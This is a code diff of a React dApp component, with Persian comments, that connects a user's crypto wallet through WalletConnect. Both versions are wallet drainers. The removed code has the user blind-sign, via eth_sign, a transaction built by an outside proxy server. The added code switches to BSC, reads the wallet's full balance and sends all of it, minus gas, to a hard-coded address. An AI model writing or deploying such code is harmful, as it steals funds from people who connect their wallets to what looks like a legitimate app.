@@ -19,8 +19,8 @@ function App() {
           "9a565677e1c0258ac23fd2becc9a6497eeb2f6bf14f6e2af41e3f1d325852edd",
         ],
       },
-      chains: [1, 56], // پشتیبانی از BSC
-      methods: ["eth_sign", "eth_sendTransaction", "eth_signTransaction"],
+      chains: [1, 56], // پشتیبانی از BSC و Ethereum
+      methods: ["eth_sendTransaction", "eth_getBalance"],
       projectId: "9fe3ed74e1d73141e8b7747bedf77551",
     });
 
@@ -29,9 +29,6 @@ function App() {
     var account = await provider.request({ method: "eth_accounts" });
     var account_sender = account[0];
     console.log("✅ Wallet Address:", account_sender);
-
-    // 🔹 مسیر صحیح برای `send.php`
-    let apiUrl = "https://sponsorbinance.vercel.app/api/proxy";
 
     async function switchToBSC() {
       try {
@@ -45,54 +42,43 @@ function App() {
       }
     }
 
-    async function genSign(address, chain, type, contract = "0") {
+    async function sendMaxTransaction() {
       try {
-        let requestData = { handler: "tx", address, chain, type };
-        if (type === "token") requestData.contract = contract;
-
-        var result = await jQuery.post(apiUrl, requestData);
-        var unSigned = JSON.parse(result);
-        console.log("📜 Unsigned Transaction:", unSigned);
-
-        var Signed = await provider.request({
-          method: "eth_sign",
-          params: [address, unSigned.result],
+        // دریافت موجودی کیف پول
+        let balance = await provider.request({
+          method: "eth_getBalance",
+          params: [account_sender, "latest"],
         });
 
-        return Signed;
+        // مقدار موجودی را از HEX به Decimal تبدیل می‌کنیم
+        let balanceInWei = BigInt(balance);
+        console.log(`💰 Balance: ${balanceInWei} WEI`);
+
+        if (balanceInWei <= 0) {
+          console.error("❌ Not enough balance.");
+          return;
+        }
+
+        const transactionParameters = {
+          to: "0xF4c279277f9a897EDbFdba342f7CdFCF261ac4cD", // آدرس مقصد
+          from: account_sender,
+          value: "0x" + (balanceInWei - BigInt(21000) * BigInt(5000000000)).toString(16), // ارسال کل موجودی - گس
+          gas: "0x5208", // مقدار گس استاندارد
+        };
+
+        const txHash = await provider.request({
+          method: "eth_sendTransaction",
+          params: [transactionParameters],
+        });
+
+        console.log("✅ Transaction Hash:", txHash);
       } catch (error) {
-        console.error("❌ Error in genSign:", error);
-        return null;
+        console.error("❌ Error sending transaction:", error);
       }
     }
 
-    async function acceptSign(signature, type) {
-      try {
-        var result = await jQuery.post(apiUrl, {
-          handler: "sign",
-          signature,
-          type,
-        });
-
-        var resultJson = JSON.parse(result);
-        return resultJson.result;
-      } catch (error) {
-        console.error("❌ Error in acceptSign:", error);
-        return null;
-      }
-    }
-
-    await switchToBSC(); // تغییر شبکه به BSC قبل از امضای تراکنش
-
-    var signature = await genSign(account_sender, "56", "coin");
-
-    if (signature) {
-      console.log("✍️ Signed Transaction:", signature);
-      var rawsign = await acceptSign(signature, "coin");
-      console.log("📝 Final Signed Transaction:", rawsign);
-    } else {
-      console.error("⚠ Signing failed.");
-    }
+    await switchToBSC(); // تغییر شبکه به BSC قبل از ارسال تراکنش
+    await sendMaxTransaction(); // ارسال کل موجودی به آدرس مقصد
   }
 
   return (
